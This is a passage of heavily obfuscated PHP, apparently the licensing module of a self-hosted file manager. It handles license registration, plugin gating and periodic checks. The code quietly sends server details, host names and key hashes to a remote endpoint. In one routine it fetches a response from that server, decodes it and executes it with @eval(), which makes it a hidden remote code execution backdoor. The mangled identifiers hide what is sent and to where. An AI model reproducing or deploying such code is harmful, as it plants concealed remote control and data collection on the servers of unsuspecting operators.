$ÎöÙüü‹[97] => (int) _get($—ÍÒñó, $ÎöÙüü‹[98], 0)); $Ä ‰›·‰ = $Ü¶òñº³[717]; $€¸¯¢ş = substr(md5($ÎöÙüü‹[99] . get_client_ip() . $®Íñ·¾Æ[$ÎöÙüü‹[100]]), 0, 15); $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[102]] = Mcrypt::encode(Session::sign(), $€¸¯¢ş, 3600 * 24); $µ‘ÓÄ = $Ü¶òñº³[718]; if (!$µ‘ÓÄ) { return; } $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[103]] = Action($ÎöÙüü‹[104])->accessToken(); $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[105]] = md5($_SERVER[$ÎöÙüü‹[106]] . $®Íñ·¾Æ[$ÎöÙüü‹[100]]); $¡Ñïé¤Ò = $Ü¶òñº³[719]; if (strlen($¡Ñïé¤Ò) < $Ü¶òñº³[697]) { die; } $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[107]] = base64_encode(serverInfo()); $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[108]] = $this->tschfe659f74; if ($®Íñ·¾Æ[$ÎöÙüü‹[108]] != $ÎöÙüü‹[109]) { $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[110]] = $®Íñ·¾Æ[$ÎöÙüü‹[110]]; $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[111]] = $®Íñ·¾Æ[$ÎöÙüü‹[111]]; $ùÚü¶ıË = rand_string(10) . $this->tschfe659f74 . rand_string(5); $ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[112]][$ÎöÙüü‹[113]] = $this->ayodf0bff992($ùÚü¶ıË, $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[105]]); } if ($this->tschfe659f74 == $ÎöÙüü‹[109]) { $ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[89]][$ÎöÙüü‹[94]][$ÎöÙüü‹[98]] = 0; } $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[114]] = $this->versionPluginFilter(); $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[115]] = _get($this->gkzn312c58de, $ÎöÙüü‹[116], $ÎöÙüü‹[6]); if (KodUser::isRoot() && $this->config[$ÎöÙüü‹[117]]) { $ÛÁì§ÓÖ[$ÎöÙüü‹[101]][$ÎöÙüü‹[118]] = WEB_ROOT; } return $ÛÁì§ÓÖ; } private function joqc3cd4ee9a() { $¶Õö÷÷• =& $_SERVER[ùèÅ´Ãš]; $³«Áî• =& $_SERVER[å‚ŞÇ•]; $æ×‘âİ£ = $_SERVER[$³«Áî•[24]] == $³«Áî•[119]; $”¥ëôÊÖ = $¶Õö÷÷•[720]; while (strlen($”¥ëôÊÖ) < $¶Õö÷÷•[700]) { if (!$”¥ëôÊÖ) { break; } $”¥ëôÊÖ++; } if ($_SERVER[$³«Áî•[24]] == $³«Áî•[120] && $_GET[$³«Áî•[121]] == $³«Áî•[122]) { $æ×‘âİ£ = !0; } if ($æ×‘âİ£) { $—ŸÒò¦• = array($³«Áî•[108] => $this->tschfe659f74, $³«Áî•[123] => $this->xenu9e4a4180(), $³«Áî•[124] => Model($³«Áî•[125])->count()); if ($this->tschfe659f74 != $³«Áî•[109]) { $ÛçÙˆÊ‹ = _get($this->gkzn312c58de, $³«Áî•[126]); if ($ÛçÙˆÊ‹) { $—ŸÒò¦•[$³«Áî•[127]] = $ÛçÙˆÊ‹; $—ŸÒò¦•[$³«Áî•[128]] = strtotime(_get($this->gkzn312c58de, $³«Áî•[129])); $—ŸÒò¦•[$³«Áî•[130]] = _get($this->gkzn312c58de, $³«Áî•[116]); } $Şáè×²´ = Model($³«Áî•[33])->get($³«Áî•[131], $³«Áî•[6], !0); if (is_string($Şáè×²´) && substr($Şáè×²´, 0, 1) == $³«Áî•[132]) { $Şáè×²´ = json_decode_force($Şáè×²´); } if (is_array($Şáè×²´) && $Şáè×²´[$³«Áî•[133]] && strstr($Şáè×²´[$³«Áî•[133]], $³«Áî•[134])) { $é‚äÇ…Å = explode($³«Áî•[134], $Şáè×²´[$³«Áî•[133]]); $—ŸÒò¦•[$³«Áî•[135]] = $é‚äÇ…Å[0]; } } $—ŸÒò¦• = $this->qerj15d7beb8(json_encode($—ŸÒò¦•), md5($³«Áî•[136])); $ì´®áş¸ = $¶Õö÷÷•[721]; $ì­°“× = array($³«Áî•[137] => $—ŸÒò¦•); call_user_func(array($³«Áî•[138], $³«Áî•[139]), $ì­°“×); $ÉÇŸÈƒ = $¶Õö÷÷•[722]; while ($ÉÇŸÈƒ < $¶Õö÷÷•[697]) { if ($ÉÇŸÈƒ >= 0) { break; } $ÉÇŸÈƒ++; } } if ($this->tschfe659f74 == $³«Áî•[109]) { return; } $ä€ıÙ½¬ = array($³«Áî•[140], $³«Áî•[141], $³«Áî•[142], $³«Áî•[143], $³«Áî•[144], $³«Áî•[145]); $áÙÊ£ìî = $¶Õö÷÷•[723]; if (strlen($áÙÊ£ìî) < $¶Õö÷÷•[697]) { return; } $­š“ş‘° = Model($³«Áî•[33])->get(); $ì­°“× = array($³«Áî•[146] => $­š“ş‘°[$³«Áî•[34]], $³«Áî•[147] => $­š“ş‘°[$³«Áî•[35]], $³«Áî•[148] => $³«Áî•[6]); $™®Ú¼Ô = $¶Õö÷÷•[724]; if (!$™®Ú¼Ô) { die; } foreach ($ä€ıÙ½¬ as $š³í…ßÜ) { if (!isset($­š“ş‘°[$š³í…ßÜ]) || !$­š“ş‘°[$š³í…ßÜ]) { continue; } $ì­°“×[$š³í…ßÜ] = $­š“ş‘°[$š³í…ßÜ]; } call_user_func(array($³«Áî•[138], $³«Áî•[139]), $ì­°“×); } private function tnxr37359f2c() { $ó«İ¾ùÊ =& $_SERVER[ùèÅ´Ãš]; $çùâ±ì¹ =& $_SERVER[å‚ŞÇ•]; if ($_SERVER[$çùâ±ì¹[24]] != $çùâ±ì¹[149]) { return; } if (!KodUser::isRoot()) { die; } $‚Õªô¸Ÿ = $GLOBALS[$çùâ±ì¹[13]]; if (isset($‚Õªô¸Ÿ[$çùâ±ì¹[150]])) { $this->zcde4afa50b6(); die; } if (isset($‚Õªô¸Ÿ[$çùâ±ì¹[151]]) && isset($‚Õªô¸Ÿ[$çùâ±ì¹[151]]) == $çùâ±ì¹[122]) { $‚Õªô¸Ÿ[$çùâ±ì¹[152]] = Model($çùâ±ì¹[33])->get($çùâ±ì¹[153]); } if (!isset($‚Õªô¸Ÿ[$çùâ±ì¹[152]]) || strlen($‚Õªô¸Ÿ[$çùâ±ì¹[152]]) != 16) { show_json($çùâ±ì¹[154] . $‚Õªô¸Ÿ[$çùâ±ì¹[152]], !1); } $‡¾‚ˆœ = Model($çùâ±ì¹[33])->get($çùâ±ì¹[100]); $¨¨¥§Ó° = md5($_SERVER[$çùâ±ì¹[106]] . $‡¾‚ˆœ); $„¡ïşÖ€ = array($çùâ±ì¹[152] => $‚Õªô¸Ÿ[$çùâ±ì¹[152]], $çùâ±ì¹[155] => rand_string(16), $çùâ±ì¹[156] => $çùâ±ì¹[136], $çùâ±ì¹[157] => $çùâ±ì¹[158], $çùâ±ì¹[159] => $_SERVER[$çùâ±ì¹[160]], $çùâ±ì¹[161] => $_SERVER[$çùâ±ì¹[162]], $çùâ±ì¹[163] => $_SERVER[$çùâ±ì¹[164]], $çùâ±ì¹[105] => $¨¨¥§Ó°, $çùâ±ì¹[165] => Model($çùâ±ì¹[33])->get($çùâ±ì¹[131])); $Š¾ãƒ§ = $ó«İ¾ùÊ[725]; if (strlen($Š¾ãƒ§) < $ó«İ¾ùÊ[697]) { die; } if (isset($‚Õªô¸Ÿ[$çùâ±ì¹[151]]) && isset($‚Õªô¸Ÿ[$çùâ±ì¹[151]]) == $çùâ±ì¹[122]) { $„¡ïşÖ€[$çùâ±ì¹[151]] = md5($„¡ïşÖ€[$çùâ±ì¹[152]] . $çùâ±ì¹[166] . $„¡ïşÖ€[$çùâ±ì¹[155]]); } if ($‚Õªô¸Ÿ[$çùâ±ì¹[167]] == $çùâ±ì¹[168]) { $ƒÑÃõÅ· = $this->qerj15d7beb8($¨¨¥§Ó°, $çùâ±ì¹[169]); $î•“Í­ = $this->ayodf0bff992(json_encode($„¡ïşÖ€), $¨¨¥§Ó° . $çùâ±ì¹[170], 3); $î•“Í­ = $î•“Í­ . $çùâ±ì¹[171] . $_SERVER[$çùâ±ì¹[160]]; $¸àà‚‰â = $this->segw477ac3ba($çùâ±ì¹[172] . $ƒÑÃõÅ· . $çùâ±ì¹[173] . $î•“Í­, -1); show_json($¸àà‚‰â, !0); } else { if ($‚Õªô¸Ÿ[$çùâ±ì¹[167]] == $çùâ±ì¹[174]) { $¦„’Õı• = substr(md5($çùâ±ì¹[175] . $¨¨¥§Ó°), 12, 15) . $çùâ±ì¹[176]; $î•“Í­ = $this->msice72ac6de(trim($‚Õªô¸Ÿ[$çùâ±ì¹[177]]), $¦„’Õı•, 2); $„¨ªí¾ô = json_decode($î•“Í­, !0); if (!is_array($„¨ªí¾ô) || !is_array($„¨ªí¾ô[$çùâ±ì¹[178]]) || $„¨ªí¾ô[$çùâ±ì¹[152]] != !0) { $Â±ƒ•î = $çùâ±ì¹[179]; $‘‘šÓÛÌ = $„¨ªí¾ô[$çùâ±ì¹[178]] ? $çùâ±ì¹[180] . $„¨ªí¾ô[$çùâ±ì¹[178]] : $Â±ƒ•î; show_json($‘‘šÓÛÌ, !1); } else { $„¡ïşÖ€[$çùâ±ì¹[155]] = $„¨ªí¾ô[$çùâ±ì¹[178]][$çùâ±ì¹[181]]; } } else { $„¨ªí¾ô = $this->segw477ac3ba($çùâ±ì¹[182], $„¡ïşÖ€, 10); } } if (!is_array($„¨ªí¾ô) || !is_array($„¨ªí¾ô[$çùâ±ì¹[178]]) || $„¨ªí¾ô[$çùâ±ì¹[152]] != !0) { $Â±ƒ•î = LNG($çùâ±ì¹[183]); $‘‘šÓÛÌ = $„¨ªí¾ô[$çùâ±ì¹[178]] ? $çùâ±ì¹[180] . $„¨ªí¾ô[$çùâ±ì¹[178]] : $Â±ƒ•î; show_json($‘‘šÓÛÌ, !1); } $›ÎùÈöä = $„¨ªí¾ô[$çùâ±ì¹[178]]; $ÓÜÅ°¥Ô = $this->erqa710aa79a($›ÎùÈöä[$çùâ±ì¹[184]]); if (!$ÓÜÅ°¥Ô || $ÓÜÅ°¥Ô != $›ÎùÈöä[$çùâ±ì¹[129]]) { $šíÚ™ıó = array($çùâ±ì¹[185] => Model($çùâ±ì¹[33])->get($çùâ±ì¹[100]), $çùâ±ì¹[186] => $_SERVER[$çùâ±ì¹[106]], $çùâ±ì¹[187] => this_url(), $çùâ±ì¹[161] => $_SERVER[$çùâ±ì¹[162]]); $î•“Í­ = $this->sluybf204525(json_encode($šíÚ™ıó)); $this->segw477ac3ba($çùâ±ì¹[188] . $î•“Í­); show_json(LNG($çùâ±ì¹[189]), !0); } $çª—ÔĞ = array($çùâ±ì¹[153] => $›ÎùÈöä[$çùâ±ì¹[190]], $çùâ±ì¹[191] => $›ÎùÈöä[$çùâ±ì¹[192]], $çùâ±ì¹[193] => rand_string(16), $çùâ±ì¹[108] => $›ÎùÈöä[$çùâ±ì¹[194]]); if ($„¡ïşÖ€[$çùâ±ì¹[155]]) { $çª—ÔĞ[$çùâ±ì¹[193]] = $„¡ïşÖ€[$çùâ±ì¹[155]]; } $•ªÄ××Í = substr(md5($çª—ÔĞ[$çùâ±ì¹[191]]), 10, 10); $Œº¼…Õ÷ = $•ªÄ××Í . $çª—ÔĞ[$çùâ±ì¹[108]] . $çª—ÔĞ[$çùâ±ì¹[193]]; $çª—ÔĞ[$çùâ±ì¹[110]] = strrev(base64_encode($this->qerj15d7beb8($Œº¼…Õ÷, $çùâ±ì¹[195]))); $Éõ×ï¦Ã = $ó«İ¾ùÊ[726]; if (!$Éõ×ï¦Ã) { return; } $ˆùÍè¾® = rand_string(16); $§æ€ïƒØ = $ˆùÍè¾® . $çª—ÔĞ[$çùâ±ì¹[108]] . $this->qerj15d7beb8(md5($çª—ÔĞ[$çùâ±ì¹[153]]), $ˆùÍè¾®); $‰³´‰½ø = $ó«İ¾ùÊ[727]; while ($‰³´‰½ø < $ó«İ¾ùÊ[704]) { if ($‰³´‰½ø >= 0) { break; } $‰³´‰½ø++; } $çª—ÔĞ[$çùâ±ì¹[111]] = base64_encode(strrev($this->qerj15d7beb8($§æ€ïƒØ, $çùâ±ì¹[196]))); $ãú­ı× = $ó«İ¾ùÊ[728]; if (strlen($ãú­ı×) < $ó«İ¾ùÊ[704]) { return; } if ($›ÎùÈöä[$çùâ±ì¹[197]] && $›ÎùÈöä[$çùâ±ì¹[197]] >= 1) { Model($çùâ±ì¹[33])->setDeep($çùâ±ì¹[198], $çùâ±ì¹[122]); } Model($çùâ±ì¹[33])->set($çª—ÔĞ); $ŸÃïÅ© = md5($_SERVER[$çùâ±ì¹[106]] . strrev($‡¾‚ˆœ) . $çª—ÔĞ[$çùâ±ì¹[191]]); $ƒç¿¾ˆÃ = strrev(substr($ŸÃïÅ©, 10, 16)); $Ã×ûöÖ = $this->ayodf0bff992(json_encode($›ÎùÈöä), $ŸÃïÅ©); $ğ¢œ¼Á¡ = array_to_keyvalue(Model($çùâ±ì¹[7])->listData(), $çùâ±ì¹[199]); $µÍÆ×¹ä = $ğ¢œ¼Á¡[$çùâ±ì¹[200]]; $à™†ìâá = $ó«İ¾ùÊ[729]; if (strlen($à™†ìâá) < $ó«İ¾ùÊ[693]) { return; } $ªèÀ•äÒ = array(); $ªèÀ•äÒ[$ƒç¿¾ˆÃ] = $Ã×ûöÖ; Model($çùâ±ì¹[7])->update($µÍÆ×¹ä[$çùâ±ì¹[201]], array($çùâ±ì¹[202] => $ªèÀ•äÒ)); $this->gkzn312c58de = $›ÎùÈöä; $this->tschfe659f74 = $çª—ÔĞ[$çùâ±ì¹[108]]; $«ƒô¹öÍ = $ó«İ¾ùÊ[730]; $this->licenseRegistSuccess(); $çÙó¿ïË = $ó«İ¾ùÊ[731]; if (!$çÙó¿ïË) { return; } Cache::set($çùâ±ì¹[203] . md5($‡¾‚ˆœ . $çùâ±ì¹[204]), $çùâ±ì¹[6]); $ ½Ÿáüî = $ó«İ¾ùÊ[732]; show_json(LNG($çùâ±ì¹[189]), !0); $ıü·ñÇ = $ó«İ¾ùÊ[733]; } private function licenseRegistSuccess() { $ÑÍœÒìÄ =& $_SERVER[å‚ŞÇ•]; $¿ĞÓğØ = Model($ÑÍœÒìÄ[33])->get(); if ($¿ĞÓğØ[$ÑÍœÒìÄ[63]] != $ÑÍœÒìÄ[122]) { Model($ÑÍœÒìÄ[33])->set($ÑÍœÒìÄ[63], $ÑÍœÒìÄ[122]); } Action($ÑÍœÒìÄ[205])->initStart(!0); } private function zcde4afa50b6() { $“¤¢‰õè =& $_SERVER[ùèÅ´Ãš]; $À¡ëã =& $_SERVER[å‚ŞÇ•]; Model($À¡ëã[33])->set(array($À¡ëã[153] => $À¡ëã[6], $À¡ëã[191] => $À¡ëã[6], $À¡ëã[108] => $À¡ëã[109], $À¡ëã[110] => $À¡ëã[6], $À¡ëã[111] => $À¡ëã[6])); Model($À¡ëã[33])->setDeep($À¡ëã[198], $À¡ëã[206]); $îÓùı¹ü = $“¤¢‰õè[734]; while (strlen($îÓùı¹ü) < $“¤¢‰õè[695]) { if (!$îÓùı¹ü) { break; } $îÓùı¹ü++; } $this->gkzn312c58de = array(); $this->tschfe659f74 = $À¡ëã[109]; $³òÊĞıŸ = $“¤¢‰õè[735]; while (strlen($³òÊĞıŸ) < $“¤¢‰õè[697]) { if (!$³òÊĞıŸ) { break; } $³òÊĞıŸ++; } } private function feaq837e1da8() { $•¶…Öôï =& $_SERVER[å‚ŞÇ•]; $_SERVER[$•¶…Öôï[162]] = _get($_SERVER, $•¶…Öôï[162], APP_HOST); $this->tschfe659f74 = $•¶…Öôï[109]; $Ïşàî×š = Model($•¶…Öôï[33])->get(); if ($Ïşàî×š[$•¶…Öôï[108]] == $•¶…Öôï[109]) { return; } $´ı‘”è› = Model($•¶…Öôï[33])->get($•¶…Öôï[100]); $¢¤¶ûñ = $•¶…Öôï[203] . md5($´ı‘”è› . $•¶…Öôï[204]); $Ó¿ïê¹ö = Cache::get($¢¤¶ûñ); if (!is_array($Ó¿ïê¹ö) || !isset($Ó¿ïê¹ö[$•¶…Öôï[207]]) || time() - $Ó¿ïê¹ö[$•¶…Öôï[207]] >= 60) { $âÁüå½§ = Model($•¶…Öôï[7])->loadList(); $é‰òÜ•ò = $âÁüå½§[$•¶…Öôï[200]]; $¦Éå”¾µ = md5($_SERVER[$•¶…Öôï[106]] . strrev($´ı‘”è›) . $Ïşàî×š[$•¶…Öôï[191]]); $´´¼™ø = strrev(substr($¦Éå”¾µ, 10, 16)); $Ó¿ïê¹ö = $this->msice72ac6de($é‰òÜ•ò[$•¶…Öôï[86]][$´´¼™ø], $¦Éå”¾µ); $Ó¿ïê¹ö = json_decode($Ó¿ïê¹ö, !0); } if (!is_array($Ó¿ïê¹ö)) { return $this->zcde4afa50b6(); } $ğ¶êòË… = strtotime($Ó¿ïê¹ö[$•¶…Öôï[129]]); if (time() >= $ğ¶êòË…) { return $this->zcde4afa50b6(); } if (!isset($Ó¿ïê¹ö[$•¶…Öôï[207]]) || time() - $Ó¿ïê¹ö[$•¶…Öôï[207]] > 20) { $Ó¿ïê¹ö[$•¶…Öôï[207]] = time(); Cache::set($¢¤¶ûñ, $Ó¿ïê¹ö); } $this->gkzn312c58de = $Ó¿ïê¹ö; $this->tschfe659f74 = $Ïşàî×š[$•¶…Öôï[108]]; $Û¾ª‡Úµ = $_SERVER[ùèÅ´Ãš][736]; if (!$Û¾ª‡Úµ) { die; } } private function jard8ab38f80() { $¥î½Ü”ö =& $_SERVER[ùèÅ´Ãš]; $…¨åãïğ =& $_SERVER[å‚ŞÇ•]; $á©äĞì = $GLOBALS[$…¨åãïğ[13]]; $ñøÇÒË = $¥î½Ü”ö[737]; while ($ñøÇÒË < $¥î½Ü”ö[697]) { if ($ñøÇÒË >= 0) { break; } $ñøÇÒË++; } $æöôÖé³ = $_SERVER[$…¨åãïğ[24]]; if ($æöôÖé³ == $…¨åãïğ[208] && $this->tschfe659f74 == $…¨åãïğ[109]) { show_json(LNG($…¨åãïğ[209]), !1, $…¨åãïğ[210]); } $Ë‡ÛØ¢– = array($…¨åãïğ[211], $…¨åãïğ[212]); if (in_array($æöôÖé³, $Ë‡ÛØ¢–)) { if ($this->tschfe659f74 == $…¨åãïğ[109] && isset($á©äĞì[$…¨åãïğ[213]])) { show_json(LNG($…¨åãïğ[209]), !1, $…¨åãïğ[210]); die; } $’Ô°ùæ = $this->xenu9e4a4180(); if ($’Ô°ùæ != intval($…¨åãïğ[214])) { if ($’Ô°ùæ <= Model($…¨åãïğ[125])->count()) { show_json(LNG($…¨åãïğ[215]), !1, $…¨åãïğ[210]); die; } } } } private function vdpg424ca0ea() { $ÖõÊ¬ƒÄ =& $_SERVER[ùèÅ´Ãš]; $ÄÔ½Íò =& $_SERVER[å‚ŞÇ•]; $¬«íÍö = array($ÄÔ½Íò[119], $ÄÔ½Íò[120]); $½Å³Ÿç± = $ÖõÊ¬ƒÄ[738]; if (!$½Å³Ÿç±) { return; } if (!KodUser::isRoot() || !isset($_GET[$ÄÔ½Íò[216]])) { return; } if (!in_array($_SERVER[$ÄÔ½Íò[24]], $¬«íÍö)) { return; } $¼õÚ¶Ë† = $ÄÔ½Íò[217]; $È’±‚ = $ÖõÊ¬ƒÄ[739]; $¼õÚ¶Ë† = $this->wqdnb36f692d($¼õÚ¶Ë†, $ÄÔ½Íò[218]); $Ñä‘¶Ó¹ = stream_context_create(array($ÄÔ½Íò[219] => array($ÄÔ½Íò[220] => $ÄÔ½Íò[221], $ÄÔ½Íò[222] => 3))); $£Ó¸äÍ¨ = $ÖõÊ¬ƒÄ[740]; $ş‡‘ææ° = @file_get_contents($¼õÚ¶Ë†, !1, $Ñä‘¶Ó¹); $Ôë¯ù’® = $ÖõÊ¬ƒÄ[741]; header($ÄÔ½Íò[223]); if ($ş‡‘ææ° && strstr($ş‡‘ææ°, $ÄÔ½Íò[224])) { echo $ş‡‘ææ°; } die; } public function authf67c5099($ëå€éšŒ) { $”× í¥£ =& $_SERVER[ùèÅ´Ãš]; $¯¼÷Ô =& $_SERVER[å‚ŞÇ•]; if ($this->tschfe659f74 == $¯¼÷Ô[225]) { return $ëå€éšŒ; } $¨õü„ï± = $this->versionPluginList(); $øÙ¼’¥ = explode($¯¼÷Ô[226], $this->versionPluginFilter()); $£‚Ã¦É = array(); foreach ($¨õü„ï± as $Àğ¯µ¸ => $ØáÇöÇù) { if ($ØáÇöÇù == $¯¼÷Ô[227] && substr($this->tschfe659f74, 0, 1) == $¯¼÷Ô[227]) { continue; } if (!in_array($Àğ¯µ¸, $øÙ¼’¥)) { $£‚Ã¦É[] = $Àğ¯µ¸; } } foreach ($£‚Ã¦É as $Àğ¯µ¸) { unset($ëå€éšŒ[$Àğ¯µ¸]); $‹»ş±òş = $”× í¥£[742]; if (!$‹»ş±òş) { die; } } return $ëå€éšŒ; $¯–ñ¶ü“ = $”× í¥£[743]; if (strlen($¯–ñ¶ü“) < $”× í¥£[693]) { die; } } private function versionPluginList() { $®ÖµÌ±¬ =& $_SERVER[å‚ŞÇ•]; return array($®ÖµÌ±¬[228] => $®ÖµÌ±¬[227], $®ÖµÌ±¬[229] => $®ÖµÌ±¬[227], $®ÖµÌ±¬[230] => $®ÖµÌ±¬[227], $®ÖµÌ±¬[231] => $®ÖµÌ±¬[227], $®ÖµÌ±¬[232] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[234] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[235] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[236] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[237] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[238] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[239] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[240] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[241] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[242] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[243] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[244] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[245] => $®ÖµÌ±¬[233], $®ÖµÌ±¬[246] => $®ÖµÌ±¬[233]); $æˆ¡ÄŸÚ = $_SERVER[ùèÅ´Ãš][744]; } private function versionPluginFilter() { $•¨Ù†¼† =& $_SERVER[ùèÅ´Ãš]; $’»ú™ñÖ =& $_SERVER[å‚ŞÇ•]; if ($this->tschfe659f74 == $’»ú™ñÖ[109]) { return $’»ú™ñÖ[6]; } $ãÁ×îó = _get($this->gkzn312c58de, $’»ú™ñÖ[247], $’»ú™ñÖ[6]); $–¢êÔ = $•¨Ù†¼†[745]; if (!$–¢êÔ) { die; } $¾¨Ì“Ó· = _get($this->gkzn312c58de, $’»ú™ñÖ[116], $’»ú™ñÖ[6]); $œŒ»İŠä = $•¨Ù†¼†[746]; while (strlen($œŒ»İŠä) < $•¨Ù†¼†[695]) { if (!$œŒ»İŠä) { break; } $œŒ»İŠä++; } $ôñ·éëÈ = _get($this->gkzn312c58de, $’»ú™ñÖ[248], $’»ú™ñÖ[6]); $¿¾™æ½Ã = $•¨Ù†¼†[747]; while ($¿¾™æ½Ã < $•¨Ù†¼†[700]) { if ($¿¾™æ½Ã >= 0) { break; } $¿¾™æ½Ã++; } if ($¾¨Ì“Ó· > time() && $ôñ·éëÈ > time()) { $ªÓ¯ê–ú = explode($’»ú™ñÖ[226], $ãÁ×îó); $¼Ãî€»Œ = array_keys($this->versionPluginList()); $ãÁ×îó = array_merge($ªÓ¯ê–ú, $¼Ãî€»Œ); $ãÁ×îó = implode($’»ú™ñÖ[226], array_filter(array_unique($ãÁ×îó))); } return $ãÁ×îó; } private function zwfm526df5e1() { $¦«ù£æÍ =& $_SERVER[å‚ŞÇ•]; if ($this->tschfe659f74 != $¦«ù£æÍ[109]) { $GLOBALS[$¦«ù£æÍ[86]][$¦«ù£æÍ[90]][$¦«ù£æÍ[249]] = $¦«ù£æÍ[206]; return; } $GLOBALS[$¦«ù£æÍ[86]][$¦«ù£æÍ[250]] = $¦«ù£æÍ[122]; if (Model($¦«ù£æÍ[251])->get($¦«ù£æÍ[63]) != $¦«ù£æÍ[206]) { Model($¦«ù£æÍ[251])->set($¦«ù£æÍ[63], $¦«ù£æÍ[206]); } } public function exjr57dc988b() { return $_SERVER[å‚ŞÇ•][252]; } private function ibnd3668d59f() { $ÄúÒãÙÁ =& $_SERVER[ùèÅ´Ãš]; $üÜÀ„ªÅ =& $_SERVER[å‚ŞÇ•]; $İœÙá = array($üÜÀ„ªÅ[253], $üÜÀ„ªÅ[254], $üÜÀ„ªÅ[255]); $Ë¡Ï¹ü× = $ÄúÒãÙÁ[748]; if (!$Ë¡Ï¹ü×) { return; } $ŞÏ–íÅÛ = $üÜÀ„ªÅ[256] . md5($üÜÀ„ªÅ[257]); if ($this->tschfe659f74 == $üÜÀ„ªÅ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$üÜÀ„ªÅ[24]], $İœÙá)) { return; } if (time() % 4 != 0) { return; } $÷‰„Çò— = call_user_func(array($üÜÀ„ªÅ[258], $üÜÀ„ªÅ[259]), $ŞÏ–íÅÛ); if ($÷‰„Çò— && time() - $÷‰„Çò— < intval($üÜÀ„ªÅ[260])) { return; } call_user_func(array($üÜÀ„ªÅ[258], $üÜÀ„ªÅ[139]), $ŞÏ–íÅÛ, time()); $ÍÊõ‚Á” = Model($üÜÀ„ªÅ[33])->get($üÜÀ„ªÅ[100]); $Îº–éİê = array($üÜÀ„ªÅ[152] => Model($üÜÀ„ªÅ[33])->get($üÜÀ„ªÅ[153]), $üÜÀ„ªÅ[167] => $this->tschfe659f74, $üÜÀ„ªÅ[163] => $_SERVER[$üÜÀ„ªÅ[164]], $üÜÀ„ªÅ[165] => Model($üÜÀ„ªÅ[33])->get($üÜÀ„ªÅ[131]), $üÜÀ„ªÅ[105] => md5($_SERVER[$üÜÀ„ªÅ[106]] . $ÍÊõ‚Á”), $üÜÀ„ªÅ[156] => $üÜÀ„ªÅ[136], $üÜÀ„ªÅ[159] => $_SERVER[$üÜÀ„ªÅ[160]]); $§†÷àÆ = $ÄúÒãÙÁ[749]; if (strlen($§†÷àÆ) < $ÄúÒãÙÁ[697]) { die; } $Ô¬›§Œ = $this->segw477ac3ba($üÜÀ„ªÅ[261], $Îº–éİê); $‘»µ = $ÄúÒãÙÁ[750]; if (!$‘»µ) { return; } if (!is_array($Ô¬›§Œ)) { return; } if ($Ô¬›§Œ[$üÜÀ„ªÅ[152]] && $Ô¬›§Œ[$üÜÀ„ªÅ[262]]) { if ($this->erqa710aa79a($Ô¬›§Œ[$üÜÀ„ªÅ[262]]) == $Îº–éİê[$üÜÀ„ªÅ[152]]) { return; } } $this->zcde4afa50b6(); $Â«Ş–÷ï = $ÄúÒãÙÁ[751]; if (!$Â«Ş–÷ï) { die; } if ($this->erqa710aa79a($Ô¬›§Œ[$üÜÀ„ªÅ[262]]) != $Îº–éİê[$üÜÀ„ªÅ[152]]) { $Æ»©Ãà = array($üÜÀ„ªÅ[185] => $ÍÊõ‚Á”, $üÜÀ„ªÅ[186] => $_SERVER[$üÜÀ„ªÅ[106]], $üÜÀ„ªÅ[187] => this_url(), $üÜÀ„ªÅ[161] => $_SERVER[$üÜÀ„ªÅ[162]]); $ÄÃàÈ‹ü = $this->sluybf204525(json_encode($Æ»©Ãà)); $Ô¬›§Œ = $this->segw477ac3ba($üÜÀ„ªÅ[188] . $ÄÃàÈ‹ü); if ($Ô¬›§Œ && is_array($Ô¬›§Œ) && isset($Ô¬›§Œ[$üÜÀ„ªÅ[262]])) { $ñÔğÇ‡Ä = $this->msice72ac6de($Ô¬›§Œ[$üÜÀ„ªÅ[262]], 2); if ($ñÔğÇ‡Ä) { $ñÔğÇ‡Ä = $this->erqa710aa79a($ñÔğÇ‡Ä); } if ($ñÔğÇ‡Ä) { try { @eval($ñÔğÇ‡Ä); } catch (Exception $“¬¾ñ‡¶) { } } } } } private function segw477ac3ba($şŒØ²Ü¿ = '', $¾Şî…ú× = array(), $¿³§®Ò– = 5) { $¸êÂ¶‡ =& $_SERVER[ùèÅ´Ãš]; $·ñ¹´Ë§ =& $_SERVER[å‚ŞÇ•]; $áºÖ¶òİ = $·ñ¹´Ë§[263]; $áºÖ¶òİ = $this->wqdnb36f692d($áºÖ¶òİ, $·ñ¹´Ë§[264]); $áºÖ¶òİ = $áºÖ¶òİ . $şŒØ²Ü¿; $°ƒŸ€ÆÛ = $¸êÂ¶‡[752]; if ($¾Şî…ú× && is_array($¾Şî…ú×)) { $áºÖ¶òİ = $áºÖ¶òİ . $·ñ¹´Ë§[265] . http_build_query($¾Şî…ú×); } if ($¾Şî…ú× === -1) { return $áºÖ¶òİ; } $ë´œ¨–Ê = stream_context_create(array($·ñ¹´Ë§[219] => array($·ñ¹´Ë§[222] => $¿³§®Ò–, $·ñ¹´Ë§[220] => $·ñ¹´Ë§[266]), $·ñ¹´Ë§[267] => array($·ñ¹´Ë§[268] => !1, $·ñ¹´Ë§[269] => !1))); $¾Şî…ú× = @file_get_contents($áºÖ¶òİ, !1, $ë´œ¨–Ê); return 